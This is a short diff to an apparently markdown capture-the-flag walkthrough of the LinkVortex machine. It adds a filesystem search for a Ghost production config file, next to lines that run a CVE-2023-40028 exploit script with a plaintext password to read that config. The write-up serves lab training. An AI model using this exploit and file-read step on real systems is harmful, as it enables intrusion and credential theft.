@@ -493,6 +493,9 @@ node:x:1000:1000::/home/node:/bin/bash
 ```
 ## SSH credential
 ```bash
+$ find / -name "config.production.json" 2>/dev/null
+```
+```bash
 $ ./exploit.sh  -u admin@linkvortex.htb -p OctopiFociPilfer45
 WELCOME TO THE CVE-2023-40028 SHELL
 file> /var/lib/ghost/config.production.json
